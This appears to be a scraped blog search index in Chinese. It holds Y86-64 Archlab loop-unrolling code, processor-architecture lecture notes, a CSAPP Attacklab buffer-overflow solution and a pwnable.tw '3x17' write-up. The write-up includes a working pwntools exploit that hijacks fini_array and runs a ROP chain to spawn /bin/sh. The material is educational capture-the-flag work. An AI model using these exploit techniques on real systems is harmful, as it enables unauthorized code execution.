Loop: 之后进行循环展开，这里进行了四路循环展开，注意到，mrmovq (%rdi), %r10和rmmovq %r10, (%rsi)之间有数据关联，所以引入一个寄存器消除气泡。且在程序一开始rax必然为0，去除xorq %rax,%rax。 iaddq $-4,%rdx jl Last1 Loop: mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Npos1 iaddq $1,%rax Npos1: mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Npos2 iaddq $1,%rax Npos2: mrmovq 24(%rdi),%r11 rmmovq %r10,16(%rsi) andq %r10, %r10 jle Npos3 iaddq $1,%rax Npos3: rmmovq %r11,24(%rsi) andq %r11, %r11 jle Npos iaddq $1,%rax Npos: iaddq $32,%rdi iaddq $32,%rsi iaddq $-4,%rdx jge Loop Last1: iaddq $4,%rdx iaddq $-1,%rdx jl Done mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Last2 iaddq $1,%rax Last2: iaddq $-1,%rdx jl Done mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Last3 iaddq $1,%rax Last3: iaddq $-1,%rdx jl Done rmmovq %r10,16(%rsi) andq %r10, %r10 jle Done iaddq $1,%rax 目前得分：48.5/60 ，再展开为八路 iaddq $-8,%rdx jl Last1 Loop: mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Npos1 iaddq $1,%rax Npos1: mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Npos2 iaddq $1,%rax Npos2: mrmovq 24(%rdi),%r11 rmmovq %r10,16(%rsi) andq %r10, %r10 jle Npos3 iaddq $1,%rax Npos3: mrmovq 32(%rdi),%r10 rmmovq %r11,24(%rsi) andq %r11, %r11 jle Npos4 iaddq $1,%rax Npos4: mrmovq 40(%rdi),%r11 rmmovq %r10,32(%rsi) andq %r10, %r10 jle Npos5 iaddq $1,%rax Npos5: mrmovq 48(%rdi),%r10 rmmovq %r11,40(%rsi) andq %r11, %r11 jle Npos6 iaddq $1,%rax Npos6: mrmovq 56(%rdi),%r11 rmmovq %r10,48(%rsi) andq %r10, %r10 jle Npos7 iaddq $1,%rax Npos7: rmmovq %r11,56(%rsi) andq %r11, %r11 jle Npos iaddq $1,%rax Npos: iaddq $64,%rdi iaddq $64,%rsi iaddq $-8,%rdx jge Loop Last1: iaddq $8,%rdx iaddq $-1,%rdx jl Done mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Last2 iaddq $1,%rax Last2: iaddq $-1,%rdx jl Done mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Last3 iaddq $1,%rax Last3: iaddq $-1,%rdx jl Done mrmovq 24(%rdi),%r11 rmmovq %r10,16(%rsi) andq %r10, %r10 jle Last4 iaddq $1,%rax Last4: iaddq $-1,%rdx jl Done mrmovq 32(%rdi),%r10 rmmovq %r11,24(%rsi) andq %r11, %r11 jle Last5 iaddq $1,%rax Last5: iaddq $-1,%rdx jl Done mrmovq 40(%rdi),%r11 rmmovq %r10,32(%rsi) andq %r10, %r10 jle Last6 iaddq $1,%rax Last6: iaddq $-1,%rdx jl Done mrmovq 48(%rdi),%r10 rmmovq %r11,40(%rsi) andq %r11, %r11 jle Last7 iaddq $1,%rax Last7: iaddq $-1,%rdx jl Done rmmovq %r10,48(%rsi) andq %r10, %r10 jle Done iaddq $1,%rax 目前得分：50.1/60 ，目前我们的代码是817字节，展开为十路，超出字节限制。然后发现在，剩余部分处理时，我们多次重复执行了iaddq $-1,%rdx，jl Done所以接下来想办法简化剩余处理。首先，从确定长度入手，长度确定进行优化后，可以跳转到剩余长度的位置，简化处理。 iaddq $-9,%rdx jl Find Loop: mrmovq (%rdi),%r10 mrmovq 8(%rdi),%r11 rmmovq %r10,(%rsi) andq %r10, %r10 jle Npos1 iaddq $1,%rax Npos1: mrmovq 16(%rdi),%r10 rmmovq %r11,8(%rsi) andq %r11, %r11 jle Npos2 iaddq $1,%rax Npos2: mrmovq 24(%rdi),%r11 rmmovq %r10,16(%rsi) andq %r10, %r10 jle Npos3 iaddq $1,%rax Npos3: mrmovq 32(%rdi),%r10 rmmovq %r11,24(%rsi) andq %r11, %r11 jle Npos4 iaddq $1,%rax Npos4: mrmovq 40(%rdi),%r11 rmmovq %r10,32(%rsi) andq %r10, %r10 jle Npos5 iaddq $1,%rax Npos5: mrmovq 48(%rdi),%r10 rmmovq %r11,40(%rsi) andq %r11, %r11 jle Npos6 iaddq $1,%rax Npos6: mrmovq 56(%rdi),%r11 rmmovq %r10,48(%rsi) andq %r10, %r10 jle Npos7 iaddq $1,%rax Npos7: mrmovq 64(%rdi),%r10 rmmovq %r11,56(%rsi) andq %r11, %r11 jle Npos8 iaddq $1,%rax Npos8: rmmovq %r10,64(%rsi) andq %r10, %r10 jle Npos iaddq $1,%rax Npos: iaddq $72,%rdi iaddq $72,%rsi iaddq $-9,%rdx jge Loop Find: iaddq $6,%rdx jl Left jg Right","date":"2021-02-08","objectID":"/csapp-archlab/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Archlab","uri":"/csapp-archlab/#part-c"},{"categories":["Writeups"],"content":" Challenges Tricks pwnable.tw-3x17 fini_arry 因为最近一直在读CSAPP刷题量变少了·· ","date":"2021-02-07","objectID":"/challenges-100-week-5/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 5","uri":"/challenges-100-week-5/#"},{"categories":["Writeups"],"content":"3x17","date":"2021-02-07","objectID":"/challenges-100-week-5/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 5","uri":"/challenges-100-week-5/#3x17"},{"categories":["Writeups"],"content":"ida void __fastcall __noreturn start(__int64 a1, __int64 a2, int a3) { __int64 v3; // rax int v4; // esi __int64 v5; // [rsp-8h] [rbp-8h] BYREF void *retaddr; // [rsp+0h] [rbp+0h] BYREF v4 = v5; v5 = v3; sub_401EB0( (unsigned int)main, v4, (unsigned int)\u0026retaddr, (unsigned int)sub_4028D0, (unsigned int)libc_fini, a3, (__int64)\u0026v5); __halt(); } int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax char *v4; // [rsp+8h] [rbp-28h] char buf[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); result = (unsigned __int8)++byte_4B9330; if ( byte_4B9330 == 1 ) { sub_446EC0(1u, \"addr:\", 5uLL); sub_446E20(0, buf, 0x18uLL); v4 = (char *)(int)sub_40EE70(buf); sub_446EC0(1u, \"data:\", 5uLL); sub_446E20(0, v4, 0x18uLL); result = 0; } if ( __readfsqword(0x28u) != v6 ) sub_44A3E0(); return result; Linux x86 Program Start Up 是静态链接程序，查看start函数，发现其调用了三个函数，第一个就是main函数，而最后一个就是libc_fini函数。 在main中实现了任意地址写，但只能输入一次。我们打算采用系统调用的方式get shell，在静态链接程序中，gadget很充足。 为此，我们要布置好ROP链。为了能多次输入我们修改fini_arry数组使其不断的调用main，虽然进入输入有条件，但是因为是不断地调用，所以会发生溢出，达到条件让我们输入。 .text:0000000000402960 libc_fini proc near ; DATA XREF: start+F↑o .text:0000000000402960 ; __unwind { .text:0000000000402960 push rbp .text:0000000000402961 lea rax, unk_4B4100 .text:0000000000402968 lea rbp, off_4B40F0 .text:000000000040296F push rbx .text:0000000000402970 sub rax, rbp .text:0000000000402973 sub rsp, 8 .text:0000000000402977 sar rax, 3 .text:000000000040297B jz short loc_402996 .text:000000000040297D lea rbx, [rax-1] .text:0000000000402981 nop dword ptr [rax+00000000h] .text:0000000000402988 .text:0000000000402988 loc_402988: ; CODE XREF: libc_fini+34↓j .text:0000000000402988 call qword ptr [rbp+rbx*8+0] 这里lea rbp, off_4B40F0是将数组的地址当作rbp，而后面call qword ptr [rbp+rbx*8+0]就是相当于调用数组中的函数。所以我们通过这个将栈迁移到0x4B4100的位置。所以在这里进行ROP的构造。 ","date":"2021-02-07","objectID":"/challenges-100-week-5/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 5","uri":"/challenges-100-week-5/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=1 binary='./3x17' #gdb.attach(p) if local: p=process(binary) else: p=remote('220.249.52.133',32446) elf = ELF(binary,checksec=False) def write(addr,data): p.sendafter('addr:',str(addr)) p.sendafter('data:',data) libc_fini=0x0402960 fini_arry=0x04B40F0 main_addr=0x0401B6D pop_rax=0x041e4af pop_rdi=0x0401696 pop_rbx=0x0401e0b pop_rdx=0x0446e35 pop_rsi=0x0406c30 syscall=0x04022b4 leave_ret=0x0401c4b sh_addr=0x04B41aa fake_stack=0x04B4100 gdb.attach(p) write(fini_arry,p64(libc_fini)+p64(main_addr)) write(sh_addr,'/bin/sh\\x00') write(fake_stack,p64(pop_rax)+p64(0x3b)) write(fake_stack+0x10,p64(pop_rdi)+p64(sh_addr)) write(fake_stack+0x20,p64(pop_rsi)+p64(0)) write(fake_stack+0x30,p64(pop_rdx)+p64(0)) write(fake_stack+0x40,p64(syscall)) write(fini_arry,p64(leave_ret)) p.interactive() ","date":"2021-02-07","objectID":"/challenges-100-week-5/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 5","uri":"/challenges-100-week-5/#exp"},{"categories":["Pwning"],"content":"Lecture 04: 处理器体系结构","date":"2021-02-04","objectID":"/csapp-lecture-04/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#lecture-04-处理器体系结构"},{"categories":["Pwning"],"content":"Y86-64ISA定义一个简单的指令集，作为处理器实现的运行示例。 寄存器：15个程序寄存器：%rax，%rcx，%rdx，%rbx，%rsp，%rbp，%rsi，%rdi，%r8到%r14。这里省略了%r15，为了简化指令编码。 它们分别对应编码数字0-0xE，而0xF代表当前指令不需要寄存器操作数。 条件码：ZF、SF和OF。 PC：程序计数器 Stat：程序状态 1：AOK，正常操作 2：HLT，处理器执行了halt指令 3：ADR，遇到非法地址 4：INS，遇到非法指令 一些指令细节 movq：Y86-64中该操作被分成：irmovq，rrmovq，mrmovq，rmmovq 整数操作指令：addq，subq，andq，xorq 七个跳转指令：jmp, jle, je, jne, jl, jge, jg 条件传送指令：cmovle, cmovl, cmove, cmovne, cmovge, cmovg halt：停止指令的执行 pushq, popq的一些约定 我们知道push指令会将rsp-8，那么如果push rsp那么入栈的rsp是原始值，还是rsp-8后的值呢？ 规定在Y86-64，采用前者。 同时，pop rsp也会有歧义，Y86-64也会弹出原值，而不是+8后的。 ","date":"2021-02-04","objectID":"/csapp-lecture-04/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#y86-64isa"},{"categories":["Pwning"],"content":"HCL一些数电知识略过~ HCL类似于用布尔表达式来书写门电路的组合方式, 像这个bool eq = (a \u0026\u0026 b) || (!a \u0026\u0026 !b); HCL语言看上去很像C语言表达式, 相比C语言, HCL有一些特点: HCL的值是持续响应的, 并不是像语句一样遇到才求值 C的判断条件是不是0都是真, 而是0就是假. HCL中的值只有0和1代表高低电压, 不存在其他值. C表达式有短路作用, 而HCL一直响应输入变化, 不存在求值与否的问题. 将所有输入都假设为数据类型是int的字来解释, 其实底层是没有数据类型一说的, 这样假设是为了说起来方便. 允许比较字是否相等, 即 bool eq = (A==B) 多路复用器（Multiplexor，MUX） 实际就是数据选择器，在HCL可以使用 [ select1 : expr1; select2 : expr2; ... selectk : exprk; ] 其中，select是布尔表达式，expr是字级表达式。在HCL中，不要求不同的选择表达式之间是互斥的，但是实际的多路复用器的信号必须互斥。选择表达式是顺序求值的，所以后续的选择表达式可以在之前的选择表达式的基础上进行简化。例如： int Out={ s : A; 1 : B; }; 四选一数据选择器的表达式可以写作： bool s1 =code ==2 || code ==3 bool s0 =code ==1 || code ==3 还可以进一步简化为： bool s1 = code in {2, 3} bool s0 = code in {1, 3} 当code在集合{2, 3}中时，s1为1，而code在集合{1, 3}中时，s0为1。 存储器和时钟 时序电路，触发沿产生后才改变存储器的值。 主要有两类存储器设备： **时钟寄存器（寄存器）：**存储单个位或字，主要作为电路不同部分的组合逻辑之间的屏障。 **随机访问存储器（内存）：**存储多个字，用地址来选择读写哪个字。包括： **处理器的虚拟内存系统：**通过操作系统对存储器进行抽象，使得处理器可以在很大的地址空间中访问，地址为虚拟内存的索引值。 **寄存器文件：**是一个以寄存器标识符为地址，存储着对应程序寄存器值的随机访问存储器。在IA32或Y86-64处理器中，有15个程序寄存器（%rax~%r14）。 这里要注意区分机器级编程中的寄存器和硬件中的寄存器 **硬件：**寄存器指的是时钟寄存器，直接将它的输入和输出连接到电路的其他部分。这里称为硬件寄存器。 **机器级编程：**寄存器代表的是存储在寄存器文件中的，CPU中少数可寻址的字，地址为寄存器标识符。这里称为程序寄存器。 硬件寄存器： 当触发沿时，寄存器的输出状态才会变成新值。在此之前，寄存器的状态会一直保存。 Y86-64处理器会使用硬件寄存器保存程序计数器（PC）、条件代码（CC）和程序状态（Stat）。 寄存器文件： 寄存器文件包含两个读端口和一个写端口，意味着能读取两个程序寄存器的同时对第三个程序寄存器进行写操作。这里的地址就是程序寄存器标识符。 寄存器文件的写入操作受时钟信号控制，只有当时钟为高电平时，才将valW中的值写入dstw指示的程序寄存器中。 虚拟内存系统： 处理器用虚拟内存来保存程序数据。read和write是两个标志位，用来控制当前是要读还是写。包含通过逻辑电路实现的边界检查，如果地址超过虚拟内存地址空间，就会使得error=1。 虚拟内存的写入操作受时钟信号控制，只有当write=1并且时钟为高电平时，才会将data in的数据保存到对应地址的位置。 ","date":"2021-02-04","objectID":"/csapp-lecture-04/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#hcl"},{"categories":["Pwning"],"content":"Y86-64的顺序实现处理一条指令我们可以将其划分成若干个阶段： **取指（Fetch）：**根据程序计数器PC从内存中读取指令字节。然后完成以下步骤 从指令中提取出指令指示符字节，并且确定出指令代码（icode）和指令功能（ifun） 如果存在寄存器指示符，则从指令中确定两个寄存器标识符rA和rB 如果存在常数字，则从指令中确定ValC 根据指令指令长度以及指令地址，可确定下一条指令的地址valP **译码（Decode）：**如果存在rA和rB，则译码阶段会从寄存器文件中读取rA和rB的值valA和valB。对于push和pop指令，译码阶段还会从寄存器文件中读取%rsp的值。 **执行（Execute）：**算术逻辑单元（ALU）会根据ifun的值执行对应的计算，得到结果valE，包括 计算运算结果，会设置条件码的值，则条件传送和跳转指令会根据ifun来确定条件码组合，确定是否跳转或传送。 2. 计算内存引用的有效地址 3. 增加或减少栈指针 **访存（Memory）：**写入内存或从内存读取数据valM。 **写回（Write Back）：**将结果写入寄存器文件中。 **更新PC（PC Update）：**将PC更新为valP，使其指向下一条指令。 阶段 OPq rA, rB rrmovq rA, rB irmovq V, rB Fetch icode: ifun← $M_1[PC]$ rA: rB← $M_1[PC+1]$ valP ← PC+2 icode: ifun← $M_1[PC]$ rA: rB← $M_1[PC+1]$ valP ← PC+2 icode: ifun← $M_1[PC]$ rA: rB← $M_1[PC+1]$ valC ← $M_s[PC+2]$ valP ← PC+10 Decode valA ← $R[rA]$ valB ← $R[rB]$ valA ← $R[rA]$ Execute valE ← valA or valBSet CC valE ← 0+valA valE ← 0+valC Memory Write Back R[rB] ← valE R[rB] ← valE R[rB] ← valE PC Update PC ← valP PC ← valP PC ← valP OPq中会将ifun传入给ALU来确定OP的类型。 阶段 rmmovq rA, D(rB) mrmovq D(rB), rA Fetch icode: ifun← $M_1[PC]$ rA: rB← $M_1[PC+1]$ valC ← $M_s[PC+2]$ valP ← PC+2 icode: ifun← $M_1[PC]$ rA: rB← $M_1[PC+1]$ valC ← $M_s[PC+2]$ valP ← PC+10 Decode valA ← $R[rA]$ valB ← $R[rB]$ valB ← $R[rB]$ Execute valE ← 0+valA valE ← 0+valC Memory $M_s[valE]$ ← valA valE ← $M_s[valE]$ Write Back R[rA] ← valM PC Update PC ← valP PC ← valP 阶段 pushq rA popq rA Fetch icode: ifun← $M_1[PC]$ rA: rB← $M_1[PC+1]$ valP ← PC+2 icode: ifun← $M_1[PC]$ rA: rB← $M_1[PC+1]$ valP ← PC+2 Decode valA ← $R[rA]$ valB ← R[%rsp]​ valA ← R[%rsp] valB ← R[%rsp] Execute valE ← valB+(-8) valE ← valB+8 Memory $M_s[valE]$ ← valA valE ← $M_s[valE]$ Write Back R[%rsp] ← valE R[%rsp] ← valE R[rA] ← valM PC Update PC ← valP PC ← valP pop在译码阶段读了两次栈顶指针的值，这是为了使后续流程和别的指令相似。 阶段 jxx Dest call Dest ret Fetch icode: ifun← $M_1[PC]$ valC ← $M_s[PC+2]$ valP ← PC+9 icode: ifun← $M_1[PC]$ valC ← $M_s[PC+2]$ valP ← PC+9 icode: ifun← $M_1[PC]$ valP ← PC+1 Decode valB ← R[%rsp] valA ← R[%rsp]valB ← R[%rsp] Execute Cnd ← Cond(CC, ifun) valE ← valB+(-8) valE ← valB+8 Memory $M_s[vale]$ ← valP valM ← $M_s[valA]$ Write Back R[%rsp] ← valE R[%rsp] ← valE PC Update PC ← Cnd? valC: valP PC ← valC PC ← valM SEQ 数据内存和指令内存都是在相同的内存空间中，只是根据不同的功能对其进行划分 寄存器文件包含两个读端口A和B，以及两个写端口M和E，分别接收来自内存的值valM以及ALU计算的结构valE。 PC更新的值可能来自于：下一条指令地址valP、来自内存的值valM、调用指令或跳转指令的目标地址valC。 白色方框为时钟寄存器；蓝色方框为硬件单元，当做黑盒子而不关心细节设计；白色圆圈表示线路名字。 宽度为字长的数据使用粗线；宽度为字节或更窄的数据用细线；单个位的数据用虚线，主要表示控制值。 灰色圆角矩形表示控制逻辑块，能在不同硬件单元之间传递数据，以及操作这些硬件单元，使得对每个不同的指令执行指定的运算。 SEQ的实现包括组合逻辑和两种存储器：时钟寄存器（程序计数器和条件码寄存器）和随机访问存储器（寄存器文件、指令内存和数据内存）。我们知道组合逻辑和存储器的读取是没有时序的，只要输入一给定，输出就会发生对应的变化。但是存储器的写入是受到时钟的控制的，只有当时钟为高电位时，才会将值写入存储器中。 所以涉及到写数据的存储器（程序计数器、条件码寄存器、寄存器文件和数据内存）就需要对时序进行明确的控制，才能控制好指令各阶段的执行顺序。为了保证每条指令执行的结果能和上一节中介绍的顺序执行的结果相同，我们要保证指令的计算不会回读，即处理器不需要为了完成一条指令的执行而去读取由该指令更新的状态。因为该指令更新的状态是写入数据，需要经过一个时钟周期，如果该指令需要读取更新过的状态，就需要空出一个时钟周期。 SEQ的HCL表达式 Name Hex Meaning IHALT 0 halt INOP 1 nop IRRMOVQ 2 rrmovq IIRMOVQ 3 irmovq IRMMOVQ 4 rmmovq IMRMOVQ 5 mrmovq IOPL 6 整数运算指令 IJXX 7 跳转指令 ICALL 8 call IRET 9 ret IPUSHQ A pushq IPOPQ B popq FNONE 0 默认功能码 RRSP 4 %rsp的寄存器ID RNONE F 没有寄存器文件访问 ALUADD 0 加法运算 SAOK 1 正常操作 SADR 2 地址异常 SINS 3 非法指令 SHLT 4 halt状态码 取指 icode为第一字节的高4位，当指令地址越界时，指令内存会返回imem_error信号，此时直接将其表示为nop指令，否则获得高4位值 word icode = [ imem_error : INOP; 1 : imem_icode; ]; ifun为第一字节的低4位，当出现imem_error信号时，会使用默认功能码，否则获得低4位值 word ifun = [ imem_error : FNONE; 1 : imem_ifun; ]; instr_valid表示是否为合法指令 bool instr_valid = icode in { INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ, IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ }; need_regids表示该指令否包含寄存器指示符字节，如果指令不含有寄存器指示符字节，则会将其赋值为0xFF。 bool need_regids = icode in { IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, IIRMOVQ, IRMMOVQ, IMRMOVQ }; need_valC表示该指令是否含有常数字节 bool need_valC = icode in { IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL }; PC增加器会根据PC值、need_valC和need_regids来确定valP值，则 valP = PC+1+need_regids+8*need_valC 译码与写回 写入的目的dstE和dstM word dstE = [ icode in {IRRMOVQ} \u0026\u0026 Cnd : rB; #cmovXX指令，可以将其看成是rrmovq和条件信号Cnd的组合 icode in {IIRMOVQ, IOPQ} :","date":"2021-02-04","objectID":"/csapp-lecture-04/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#y86-64的顺序实现"},{"categories":["Pwning"],"content":"流水线我们发现，指令执行的不同阶段是在处理器的不同硬件部分进行的，所以我们可以让不同的指令同时运行，只要它们处在不同的阶段。 若不使用流水线，每个指令都要等待其上一个指令完成后才可以进行，这降低了程序的运行速度。使用流水线可以提高系统的吞吐量，但是回轻微增加延迟。 想要吞吐量最大，我们需要使得时钟周期尽可能小，而时钟周期受到最慢的组合逻辑的限制，所以我们可以将最小的组合逻辑的时间加上一个寄存器的时延作为时钟周期。想要延迟最小，就不使用流水线。 如果将每个组合逻辑变得更小，虽然可以大大增加吞吐量，但是延迟在一个时间周期的占比也增加。 另一方面，处理器中某些硬件单元，如ALU和内存，并不能被划分成多个延迟很小的单元。所以，很难找到一个统一的足够小的单元来平衡各个阶段，在Y86-64中，不去深入这部分研究。 带反馈的流水线 在很多时候，相邻的两条指令数据是有关联的，即下一条指令可能回用到上一条指令计算的结果，这被称为数据相关（data dependency）。另一种情况，是当跳转指令在进行时，其后的两个指令是执行跳转前的，还是跳转后的，这成为控制相关（control dependency）。 为了解决上述问题一种思路是加入反馈路线，但是某一阶段产生的结果会成为N个阶段后的输入，而不是当前程序的状态，这改变了系统的行为，在实际中我们无法接受这样的后果。所以这种方式并不适用于流水线化的Y86-64。 SEQ+ 为了平衡一个流水线系统各个阶段的延迟，需要使用电路重定时（Circuit Retiming）在不改变逻辑行为的基础上，修改系统的状态表示。顺序实现的SEQ中，更新PC阶段是在时钟周期结束时才执行的，通过组合电路计算得到的icode、Cnd、valC、valM和valP通过组合电路计算得到新的PC，将其保存到PC的时钟寄存器中。但是这些值是在不同阶段中计算出来的，所以SEQ+新增了一系列状态寄存器来保存之前计算出来的结果，然后将更新PC阶段放到了时钟周期开始执行，这样在每个阶段时钟周期变成高电平时就会将该阶段计算出来的值保存到状态寄存器中，然后PC逻辑电路就能根据当前的状态寄存器的值来预测下一步的PC值。 注意在SEQ+中，PC是动态移动的，即根据每一阶段的值来移动，没有特定的硬件寄存器来保存。 插入流水线的PIPE- 分别插入了5个流水线寄存器用来保存后续阶段所需的信号，编号为F、D、E、M和W。我们可以发现在D和E中都有stat信号，分别表示为D_stat和E_stat。在取指阶段和访存阶段都有通过逻辑计算得到stat信号，分别表示为f_stat和m_stat。 在SEQ+中，在译码阶段通过逻辑电路计算得到dstE和dstM，会直接将其连接到寄存器文件的写端口的地址输入，当计算出valE和valM时直接写回到对应寄存器中。但是dstE和dstM是在译码阶段计算出来的，而valE是在执行阶段计算得到，valM是在访存阶段获得的，在流水线系统PIPE-中各个阶段是相互独立的，当某条指令运行到写回阶段时，得到了valE和valM，但是当前的dstE和dstM是处于译码阶段的指令计算出来的，会出现错误，所以需要将dstE和dstM一直保存到后续的流水线寄存器中。**通用规则：**我们要保存处于一个流水线阶段中的指令的所有信息。 我们可以发现，只有call指令需要将valP保存到内存中，即我们为了call指令需要将取指阶段得到的valP一直保存到后续的流水线寄存器中，直到访存阶段将其保存到内存中。但是我们发现call指令只使用valB保存%rsp的值，并不会使用valA，所以我们可以通过PIPE-中的selectA模块将valP保存到valA，由此就不需要保存valP了。同理条件跳转指令，当不选择跳转分支时，后面也需要valP，也可以将其保存到valA中，由此也不需要保存valP了。**通用规则：**通过合并信号来减少寄存器状态和线路的数量。 **注意：**大写字母F、D等代表流水线寄存器，所以D_stat代表是寄存器的状态字段，而小写前缀代表的是流水线阶段，所以m_stat代表访存阶段中由控制逻辑块产生的状态信号。 预测下一个PC 对于call和jmp指令，下一条指令的地址就是valC，而除了条件分支和ret指令外，下一条指令的地址就是valP，这些指令不存在控制相关，使得流水线处理器能够每个时钟周期就处理一条指令。如果出现了条件分支，则需要该指令运行到执行阶段后才知道是否选择该分支，如果出现了ret指令，则需要该指令运行到访存阶段，才知道返回地址。我们选择预测PC值总是为valC。 流水线冒险 流水线冒险主要包含数据冒险和控制冒险，当程序状态的读写不处于同一阶段，就可能出现数据冒险，当出现分支预测错误或ret指令时，会出现控制冒险。 解决方法： 用暂停来避免数据冒险：我们可以在执行阶段中插入一段自动产生的nop指令，来保持寄存器、内存、条件码和程序状态不变，使得当前指令停在译码阶段，并且会控制程序计数器不变，使得下一条指令停在取指阶段，直到产生指令的源操作数的指令通过了写回阶段。该方法指令要停顿最少一个最多三个时钟周期，严重降低整体的吞吐量。 用转发来避免数据冒险：通过ALU的计算结果来转发，虽然值没有写入寄存器，但是其确实被计算出来了M_valE和e_valE，所以可以改变译码方式来避免暂停和冒险。 除了通过ALU的计算结果来转发，还能通过内存来进行转发，并且通过当前阶段的dstE和dstM与目标指令的srcA和srcB进行判断来决定是否转发。在处理器中，valA和valB一共有5个转发源： e_valE：在执行阶段，ALU中计算得到的结果valE，通过E_dstE与d_srcA和d_src_B进行比较决定是否转发。 M_valE：将ALU计算的结果valE保存到流水线寄存器M中，通过M_dstE与d_srcA和d_src_B进行比较决定是否转发。 m_valM：在访存阶段，从内存中读取的值valM，通过M_dstM与d_srcA和d_src_B进行比较决定是否转发。 W_valM：将内存中的值valM保存到流水线寄存器W中，通过W_dstM与d_srcA和d_src_B进行比较决定是否转发。 W_valE ：将ALU计算的结果valE保存到流水线寄存器W中，通过W_dstE与d_srcA和d_src_B进行比较决定是否转发。 加载/使用数据冒险：有些冒险无法通过转发来清除。我们可以对产生冒险的指令暂停一个周期。称为“加载互锁（Load Interlock）” 避免控制冒险：控制冒险只会出现在ret指令和跳转指令预测错方向时产生。解决方法是插入bubble（？） 异常处理 异常可以由程序执行从内部产生，也可以由某个外部信号从外部产生。当前的ISA包含三种内部产生的异常：1. halt指令；2. 非法指令码和功能码组合的指令；3. 取值或数据读写访问非法地址。外部产生的异常包括：接收到一个网络接口受到新包的信号、点击鼠标的信号等等。 当同时多条指令引起异常时，处理器应该向操作系统报告哪个异常？**基本原则：**由流水线中最深的指令引起的异常，优先级最高，因为指令在流水线中越深的阶段，表示该指令越早执行。 在分支预测中，当预测分支中出现了异常，而后由于预测错误而取消该指令时，需要取消异常。 暂停和气泡是流水线中低级的机制，暂停能将指令阻塞在某个阶段，往流水线中插入bubble能使得流水线继续运行，但是不会改变当前阶段的寄存器、内存、条件码或程序状态。这两个状态决定了当时钟电平变高时，如何修改流水线寄存器。 ","date":"2021-02-04","objectID":"/csapp-lecture-04/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 04","uri":"/csapp-lecture-04/#流水线"},{"categories":["Pwning"],"content":"CSAPP-Attacklab程序在一系列的初始化之后，会进入test ","date":"2021-02-02","objectID":"/csapp-attacklab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Attacklab","uri":"/csapp-attacklab/#csapp-attacklab"},{"categories":["Pwning"],"content":"phase_1 0000000000401968 \u003ctest\u003e: 401968: 48 83 ec 08 sub $0x8,%rsp 40196c: b8 00 00 00 00 mov $0x0,%eax 401971: e8 32 fe ff ff callq 4017a8 \u003cgetbuf\u003e 401976: 89 c2 mov %eax,%edx 401978: be 88 31 40 00 mov $0x403188,%esi 40197d: bf 01 00 00 00 mov $0x1,%edi 401982: b8 00 00 00 00 mov $0x0,%eax 401987: e8 64 f4 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 40198c: 48 83 c4 08 add $0x8,%rsp 00000000004017a8 \u003cgetbuf\u003e: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 \u003cGets\u003e 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 00000000004017c0 \u003ctouch1\u003e: 4017c0: 48 83 ec 08 sub $0x8,%rsp 4017c4: c7 05 0e 2d 20 00 01 movl $0x1,0x202d0e(%rip) # 6044dc \u003cvlevel\u003e 4017cb: 00 00 00 4017ce: bf c5 30 40 00 mov $0x4030c5,%edi 4017d3: e8 e8 f4 ff ff callq 400cc0 \u003cputs@plt\u003e 4017d8: bf 01 00 00 00 mov $0x1,%edi 4017dd: e8 ab 04 00 00 callq 401c8d \u003cvalidate\u003e 4017e2: bf 00 00 00 00 mov $0x0,%edi 4017e7: e8 54 f6 ff ff callq 400e40 \u003cexit@plt\u003e 覆盖返回地址，使程序进入touch1。getbuf的栈长度为0x28，Gets的第一个参数正好在栈上。所以，先输入0x28字节的padding，然后覆盖返回地址为touch1的地址。 答案(必须是hex)： 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 niebelungen@ubuntu:~/Desktop/target1$ ./hex2raw \u003c test.txt | ./ctarget -q Cookie: 0x59b997fa Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 